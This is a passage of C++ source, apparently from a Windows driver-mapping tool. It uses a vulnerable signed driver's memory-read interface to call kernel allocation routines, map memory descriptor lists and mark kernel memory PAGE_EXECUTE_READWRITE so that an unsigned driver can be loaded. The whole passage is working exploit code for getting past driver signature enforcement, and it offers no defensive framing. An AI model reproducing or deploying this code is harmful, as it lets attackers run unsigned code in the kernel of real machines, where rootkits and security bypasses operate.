        allocations::MmFreeIndependentPages(DeviceHandle, KernelBaseAddress, AllocationBase, AllocationSize);
        return NULL;
    }
    return AllocationBase;
}


PVOID allocations::AllocateDescriptorModuleWrapper(HANDLE* DeviceHandle, PVOID KernelBaseAddress, SIZE_T AllocationSize, PMDL* DescriptorModule) {
    LARGE_INTEGER LowAddress = { 0 };
    LARGE_INTEGER HighAddress = { 0 };
    SIZE_T AllignedSize = (AllocationSize / PAGE_SIZE) + 1;
    ULONG ModuleByteCount = 0;
    PVOID MappingBaseAddress = NULL;
    BOOL ProtectionResult = FALSE;
    LowAddress.QuadPart = 0;
    HighAddress.QuadPart = 0xFFFFFFFFFFFFFFFF;


    // Allocate module descriptor:
    PMDL ModuleDescriptor = (PMDL)allocations::MmAllocatePagesForMdl(DeviceHandle, KernelBaseAddress, LowAddress, HighAddress, LowAddress, AllignedSize * PAGE_SIZE);
    if (ModuleDescriptor == NULL) {
        printf("[-] Failed to allocate module descriptor memory for unsigned driver / other purposes\n");
        return NULL;
    }


    // Check if module descriptor maximum size is >= requested size;
    if (!VulnurableDriver::IoctlFunctions::MemoryRead(DeviceHandle, general::ManipulateAddress((PVOID)ModuleDescriptor, 0x28, TRUE), &ModuleByteCount, sizeof(ModuleByteCount))) {
        printf("[-] Failed to read the module descriptor\'s ByteCount attribute for unsigned driver / other purposes\n");
        return NULL;
    }
    if (ModuleByteCount < AllocationSize) {
        printf("[-] Failed to allocate enought memory for unsigned driver / other purposes (module size = %lu, requested size = %zu)\n", ModuleByteCount, AllocationSize);
        allocations::MmFreePagesFromMdl(DeviceHandle, KernelBaseAddress, ModuleDescriptor);
        allocations::ExFreePool(DeviceHandle, KernelBaseAddress, ModuleDescriptor);
        return NULL;
    }


    // Map the module descriptor to actual virtual memory:
    MappingBaseAddress = allocations::MmMapLockedPagesSpecifyCache(DeviceHandle, KernelBaseAddress, ModuleDescriptor, nt::KernelMode, nt::MmCached, NULL, FALSE, nt::NormalPagePriority);
    if (MappingBaseAddress == NULL) {
        printf("[-] Failed to map module descriptor into virtual memory for unsigned driver / other purposes\n");
        allocations::MmFreePagesFromMdl(DeviceHandle, KernelBaseAddress, ModuleDescriptor);
        allocations::ExFreePool(DeviceHandle, KernelBaseAddress, ModuleDescriptor);
        return NULL;
    }


    // Change the protection settings of the virtual memory to RXW:
    ProtectionResult = allocations::MmProtectMdlSystemAddress(DeviceHandle, KernelBaseAddress, ModuleDescriptor, PAGE_EXECUTE_READWRITE);
    if (!ProtectionResult) {
        printf("[-] Failed to change protection settings of virtual memory to PAGE_EXECUTE_READWRITE (RXW) for unsigned driver / other purposes\n");
        allocations::MmUnmapLockedPages(DeviceHandle, KernelBaseAddress, MappingBaseAddress, ModuleDescriptor);
        allocations::MmFreePagesFromMdl(DeviceHandle, KernelBaseAddress, ModuleDescriptor);
        allocations::ExFreePool(DeviceHandle, KernelBaseAddress, ModuleDescriptor);
        return NULL;
    }

    printf("[+] Allocated module descriptor and virtual memory for unsigned driver / other purposes successfully\n");
    if (DescriptorModule != NULL) {
        *DescriptorModule = ModuleDescriptor;
    }
    return MappingBaseAddress;
}